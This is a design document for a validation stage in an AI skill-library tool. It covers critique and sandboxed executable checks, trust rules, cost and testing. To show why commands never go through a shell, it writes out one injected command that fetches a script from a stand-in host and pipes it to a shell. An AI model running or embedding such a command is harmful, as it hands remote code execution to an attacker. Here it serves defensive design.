# SkillForge v0.2 — Slice D2 Design: Tier A Validation

*Approved decisions from brainstorming, 2026-08-27. Parent spec: `skillforge-architecture-v4.md` (draft 0.7), Section 7. Slice D covers Tier A validation, capture, and `/stats`; D1 shipped capture, this document is validation. Consumes the confidence view built by Slice C2 (`2026-08-21-v0.2-slice-c2-design.md`) and reuses the detached-worker pattern proven by Slice D1 (`2026-08-24-v0.2-slice-d1-design.md`).*

## What D2 is

Parent spec §7 defines `trusted` as **critique-mode Tier A passed AND (executable Tier A passed OR k≥2 real-session verification successes)**. C2 shipped the `k≥2` half and documented the gap: until Tier A lands, `trusted` means only "repeatedly verified in real sessions," which is strictly weaker than the spec.

D2 closes it. A fresh-context subagent reads a skill's text with no session context and answers two different questions:

- **Critique mode** — *legibility*. Can a fresh instance follow this? Runs on every skill. Nothing substitutes for it.
- **Executable mode** — *validity*. Does following it actually make its own verification pass? Runs where it can, substitutes for `k≥2`.

The asymmetry is the spec's, and it is load-bearing: the model that succeeded organically had full session context, so legibility goes otherwise untested. Organic evidence substitutes for the sandbox — real sessions have the environment the sandbox lacks — but nothing substitutes for the fresh-context read.

D2 raises the bar for standing context. It does not change the `working` bucket, the hot-tier budget, or the hot gate (`working`-or-better), so an unvalidated skill is still injected normally. It just does not get to sit in every prompt.

## Design decisions made during brainstorming

1. **Executable mode runs on trusted skills only, in a throwaway worktree.** §11.2 is explicit that skill files are attacker-controlled payloads and `git pull` is a delivery channel. Today `trust.json` gates *injection*; executable mode adds a stronger verb, *execution*. It therefore runs only on skills already approved in `trust.json`, and the approval prompt is reworded to say plainly that approving also permits running the skill's `verification.command` in a sandbox. Quarantined and pulled skills get critique only until a human approves them.

2. **Critique fires on save; executable fires lazily at SessionStart.** Critique reads only text, needs no environment, and legibility is exactly what a fresh save should be checked for — so `save_skill.py` spawns it detached and returns. Executable needs a worktree and a runnable command, and is an agentic run rather than one turn, so it is scheduled rather than eager.

3. **Executable is rate-limited and ordered, not gated on a threshold.** An earlier proposal gated executable on ≥1 organic success. It was wrong: warm tier surfaces skills by BM25 match against the prompt, so a skill whose value is mid-task recall may never match a prompt, never earn a success, never validate, never reach `trusted`, and therefore never enter the only tier that would have surfaced it — a closed loop around precisely the skills §8 says hot tier exists for. Instead: sync spawns **at most one** executable run per session, over candidates ordered by organic successes descending, then most recently saved. Everything eventually validates; nothing deadlocks; cost is bounded by sessions rather than library size.

4. **Executable mode is followability, with a vacuity pre-check (B+).** §7 asks "can a fresh instance follow this?", not "does this fix the original bug." Before any model call, `verification.command` runs in the untouched worktree. If it already passes, the verification cannot distinguish a followed skill from an ignored one — verdict `inconclusive`, no model call spent. This is the inverse of the benchmark's own lesson: a condition scoring zero across all arms is a suspect test, and equally, a verification passing before any work is a suspect verification. (That benchmark — `bench/RESULTS.md`, the paired A/B harness, and its results — lives on the unmerged branch `claude/project-status-roadmap-4c408a`, not on `main`. C2 cites it as decisive evidence for a shipped decision, so the reasoning is on `main` while the evidence is not. Worth merging or vendoring before D2 leans on it further.)

5. **The worktree is `provenance.repo` at current HEAD, never `provenance.commit`.** `skills/distilling-skills/SKILL.md:87` defines `commit` as HEAD at distillation time, not the commit that fixed the bug — the fix is frequently uncommitted when a skill is captured. At `provenance.commit` the fix is already present, so the pre-check would return `inconclusive` every time. HEAD is the real environment the skill claims to be about. No local repo means a bare temp dir.

6. **Three verdicts, not two: `pass`, `fail`, `inconclusive`.** Only `pass` satisfies the validity half; `fail` and `inconclusive` both leave it to organic evidence, so neither blocks anything that is not already blocked. But they mean opposite things — `inconclusive` is *we could not test this*, `fail` is *we tested it and a fresh instance could not follow it*. Conflating them repeats the absent-vs-corrupt bug fixed in `load_triggers`.

7. **A `fail` withholds the executable route, surfaces in the library, and vetoes nothing.** The spec says organic evidence substitutes for the sandbox because "real sessions have the environment the sandbox lacks," so a sandboxed failure must not cap a skill that demonstrably works in practice. A skill that fails executable can still reach `trusted` via k≥2 organic successes. Since `fail` is therefore inert in the bucket rule, visibility in `/skillforge:library` is the only thing it can do — and without it, `fail` would be a result the system computes, records, and entirely ignores.

8. **A critique verdict is computed from structured findings, never declared by the model.** Executable mode has an oracle: an exit code. Critique has none, and critique is the conjunct nothing substitutes for — so the gate's strength rests entirely on its half with no ground truth. A model asked "is this good?" says yes. Three mitigations, all three adopted: **adversarial framing** (find the reason a fresh instance would fail; pass only if you genuinely cannot), **per-criterion findings with a quoted span from the skill text as evidence for each** (vague praise cannot produce a quotable span), and **separate rubrics per `kind`** — followability for skills, structure for anti-skills, whose Trap/Symptom/Cause/Fix shape §4.2 calls "checkable by inspection."

9. **The Tier A conjunct is applied in Python, not in the SQL view.** Verdicts are keyed by content hash; the hash lives on disk. A view cannot know which hash is current, so it cannot distinguish a pass belonging to *this* text from one belonging to a version edited afterward. Name-keyed lookup would let a skill pass critique, be edited, be re-approved, and silently keep the pass — the exact hole hash-keying exists to close. `ledger.confidence()` takes the `{skill: hash}` map sync already computes and applies the conjunct there.

10. **Concurrency is an advisory file lock, not a status row.** D1 guards the drafter with a `drafting` row reaped by wall clock, because the `drafts` row *is* the delivery queue and must exist mid-flight. A validation row is only a result; nothing polls it. So the lock is the process, not the row: `fcntl.flock`, non-blocking, released by the kernel the instant the process dies — exact on crash, with no timeout to guess. This removes a tuning constant rather than adding one, and keeps `verdict` holding only real verdicts instead of a workflow state smuggled into a results column.

11. **`verification.command` never goes through a shell.** `shlex.split` into list-form `Popen`, never `shell=True`. A command string containing shell metacharacters — pipes, `;`, `&&`, backticks, redirects — yields `inconclusive` rather than an execution attempt. `stripe trigger x; curl evil.sh | sh` must never be something this system runs. The cost is that legitimately shell-shaped verifications cannot be executed, which is precisely what critique mode is the fallback for.

## Where this departs from parent spec §7

1. **The bucket is no longer purely a SQL view.** C2 decision 4 states "buckets are a SQL view, never frontmatter." Half the computation moves into Python (decision 9). This is forced rather than chosen: the alternative is dropping the hash guarantee, which guts the gate. The organic computation stays in SQL; only the conjunct moves.

2. **Executable mode proves followability, not repair.** §7's phrasing — "follow the skill in a scratch worktree and run its `verification.command`" — is implemented literally. A pass claims: *a fresh instance, given only this text, reached a state where the skill's own verification passes, in a context where that verification was failing beforehand.* It does not claim the skill fixes the bug it was distilled from. The `AND` structure already assigns validity to executable-or-organic, and organic evidence carries the real environment.

3. **Anti-skills can never be executable-validated.** §4.2 gives them no Verification section and no `verification.command`, so their path to `trusted` is critique + k≥2 organic, permanently. Since D1's automatic capture produces anti-skills, this is the common case rather than an edge case. §7 does not discuss it.

4. **Executable is rate-limited to one per session.** §7 calls Tier A "cheap, always runs." Critique is; executable is an agentic run and is not. The spec's cheapness claim holds for the universal gate and is relaxed for the preferred mode, ordered so evidence-bearing skills validate first.

## Components

### 1. Validations table and the conjunct — `scripts/ledger.py`

```sql
CREATE TABLE IF NOT EXISTS validations (
  id INTEGER PRIMARY KEY,
  skill TEXT NOT NULL,
  content_hash TEXT NOT NULL,
  mode TEXT NOT NULL,        -- critique | executable
  verdict TEXT NOT NULL,     -- pass | fail | inconclusive
  detail TEXT,               -- structured findings, bounded
  ts TEXT NOT NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS idx_validations_key
  ON validations(skill, content_hash, mode);
```

The unique index makes "is there a verdict for this hash?" one indexed lookup and makes re-recording idempotent.

`confidence(path=None, hashes=None)` gains the optional `{skill: content_hash}` map. With it, the conjunct applies — parenthesised explicitly, because the precedence is the whole rule:

```
critique == pass
  AND ( executable == pass
        OR (success_sessions >= 2 AND failure_sessions = 0) )
  AND (last_used IS NULL OR age <= 90 days)
->  trusted
```

Called without `hashes`, `confidence()` returns the **organic** bucket unchanged, so the change is additive and existing callers keep working. That is a sharp edge: a caller that forgets to pass hashes silently gets the weaker, pre-D2 answer. Two mitigations, both required — the returned dict names the field `organic_bucket` when `hashes` is absent and `bucket` only when the conjunct was actually applied, so a caller reading `bucket` on an unhashed call raises `KeyError` rather than over-trusting; and `sync.py`, the only caller that compiles buckets into `index.json`, always passes hashes.

**One migration, for honesty rather than logic.** The view's SQL is unchanged, so C2's anticipated hazard mostly evaporates. But left alone, `skill_confidence.bucket` would report `trusted` for skills that are not — a view whose name has become a lie. The column is renamed `bucket` → `organic_bucket` by an explicit one-time `DROP VIEW` + `CREATE VIEW`, gated on a `schema_version` row read once per connect. **Not** DDL on every `connect()`: `detect.py` connects on every tool call, and that would mean a write transaction per tool call. One production consumer (`ledger.py:147`) and two tests read the view today.

### 2. Validator — `scripts/validate.py` (new)

One entry point, two modes: `validate.py critique --skill <name>` and `validate.py executable --skill <name>`. Structurally a sibling of `draft.py`.

Three module-level seams, replaced wholesale by tests:

- `run_model(prompt, ...)` — no suite spends a token.
- `run_verification(argv, cwd, timeout)` — no suite executes a command from a skill file.
- `make_worktree(repo, dest)` — no suite touches git.

Exits 0 always; prints nothing to stdout; diagnostics to stderr.

### 3. Critique mode — `scripts/validate.py`

Reads the skill file, hashes it, returns early if a verdict exists for that hash. Selects the rubric by `kind`:

- **skill** — is the procedure followable without the source session in mind? Are preconditions complete? Is the verification actually checkable?
- **antiskill** — does Fix actually address Cause? Is Symptom specific enough to match on? Is the Trap statement falsifiable?

The prompt is adversarial: find the reason a fresh instance would fail. The model returns per-criterion findings, each carrying a verbatim span quoted from the skill text. `validate.py` computes the verdict; the model never states one. A response that cannot be parsed into findings is `inconclusive`, not `fail`.

Prompt assembly inherits D1's discipline for untrusted text: concatenation, never `%`-formatting; the untrusted-data warning *before* the skill text; an explicit end delimiter after it.

### 4. Executable mode — `scripts/validate.py`

Preconditions, all four required: the skill is in `trust.json`; it has a `verification.command`; no verdict exists for this hash; `provenance.repo` resolves to a local git repo or the verification is self-contained.

1. **Setup** — throwaway worktree of `provenance.repo` at HEAD, or a temp dir. Removed in a `finally`.
2. **Vacuity pre-check** — run `verification.command` in the untouched worktree. Exits 0 → `inconclusive`, stop, no model call. Cannot run at all (binary missing, needs credentials, times out, contains shell metacharacters) → `inconclusive`. Exits non-zero → proceed.
3. **Fresh-context run** — a subagent receives only the skill text and the worktree, and follows the procedure.
4. **Re-run** — exits 0 → `pass`; non-zero → `fail`.
5. **Teardown** — unconditional.

Envelope: no network, wall-clock timeout, output caps, `SKILLFORGE_DRAFTING=1` in the child so hooks stay inert.

### 5. Triggers — `scripts/save_skill.py` and `scripts/sync.py`

`save_skill.py` spawns `validate.py critique` detached after a successful save and exits. Its contract is unchanged: D2 adds a caller, not a rule. Both existing save paths — `/skillforge:learn` and D1's draft approval — route through it, so one hook covers both.

`sync.py` already walks every trusted skill and computes confidence at SessionStart, so it is the one place that can see the executable candidate set. It selects eligible skills, orders them (decision 3), and spawns one detached run.

### 6. Surfacing — `scripts/library.py`

`list` gains critique and executable verdicts per skill. Without it a `fail` is invisible and therefore inert (decision 7).

### 7. Blast radius

The only new execution surface is executable mode, bounded by decisions 1, 5 and 11: trusted-only, throwaway worktree at HEAD, no shell, no network, timeout, output caps, teardown in `finally`. Critique mode executes nothing; it only reads text into a prompt.

Failure direction is uniformly toward less trust. `confidence()` returns `{}` on any failure, which reads as `unproven` everywhere, and the conjunct only ever *removes* skills from `trusted` — so a broken validations table empties the hot tier rather than promoting on stale data.

## Data flow, end to end

1. A skill is saved. `save_skill.py` validates, secret-scans, writes to the store, records trust, syncs, then spawns `validate.py critique` detached and returns. The user waits on nothing.
2. The critique worker hashes the file, returns early if a verdict exists, picks the rubric by `kind`, calls the model, computes a verdict from the findings, and writes one row.
3. At the next SessionStart, `sync.sync()` reads verdicts along with confidence and compiles buckets into `index.json`. A skill with critique `pass` and k≥2 organic successes is now `trusted`; one without critique is not, however many successes it has.
4. Sync also selects the executable candidate set, orders it, and spawns one detached run.
5. The executable worker takes the lock, builds the worktree, runs the vacuity pre-check, and either stops at `inconclusive` before spending anything or runs the fresh-context subagent, re-runs the verification, records the verdict, and tears down.
6. At the next SessionStart the verdict is compiled in. A skill with critique `pass` and executable `pass` is `trusted` with no organic evidence at all.
7. `/skillforge:library` shows both verdicts, so a `fail` is visible and actionable.

Nothing in either flow blocks a session. A verdict recorded mid-session is not reflected until the next sync, which is correct: buckets affect only tiering, and tiering is compiled by sync.

## Cost

Critique is one `claude -p` turn per saved skill, per content hash — D1's drafter profile, roughly a minute, detached. Re-saving unchanged text costs nothing; the hash already has a verdict.

Executable is an agentic run — a subagent following a procedure and running a command — so minutes and thousands of tokens, not one turn. It is bounded three ways: once ever per content hash, at most one per session, and skipped entirely when the vacuity pre-check passes (which costs one subprocess and no model call). A twenty-skill library reaches full validation in at most twenty sessions, evidence-bearing skills first, with no burst.

The interactive session pays nothing in either mode: one `Popen` on save, one at SessionStart, neither waited on.

## Testing

House convention: plain `def test_*()` functions with an `assert`-based `__main__` runner, run as `python3 tests/test_<name>.py`, no pytest.

The three seams (component 2) keep every suite hermetic — no model calls, no skill-authored commands, no git worktrees. What remains is pure and directly testable: verdict computation from findings, candidate eligibility and ordering, hash-keyed lookup and its invalidation on edit, the vacuity pre-check's three-way branch, the shell-metacharacter refusal, and the conjunct itself.

The conjunct gets an explicit truth table — all combinations of critique × executable × organic — because it decides what enters context on every prompt. The migration gets a test that runs it against a database created under the C2 schema and asserts both the rename and that it runs exactly once.

Per this project's standard, negative tests carry mutation proof rather than a RED run alone: a test that cannot fail is worse than no test. D1 shipped several that passed before the code they were meant to pin existed, and the follow-up branch produced two more that its author caught only by running RED. Assume this slice will produce some too, and design the checks to catch them.

## Explicitly not in D2

- **Tier B** — §7 is explicit: "v0.2 ships Tier A (both modes); Tier B arrives when there's something specific to be suspicious of." Its replayed-prompt task construction and k≥3 paired runs are a slice of their own.
- **`/stats`** — the remaining slice D piece. `/skillforge:library` shows verdicts; it is not an analytics surface.
- **Re-validation on a schedule.** A verdict is per content hash and never expires. Staleness auditing is `last_validated` and the Maintainer (§10), not D2.
- **Changing the hot-tier gate.** It stays `working`-or-better. D2 changes what `trusted` means, not what hot requires.
- **Preference capture** — §5's third channel, its own slice.
- **Any change to `save_skill.py`'s contract.** D2 adds a caller, not a rule.
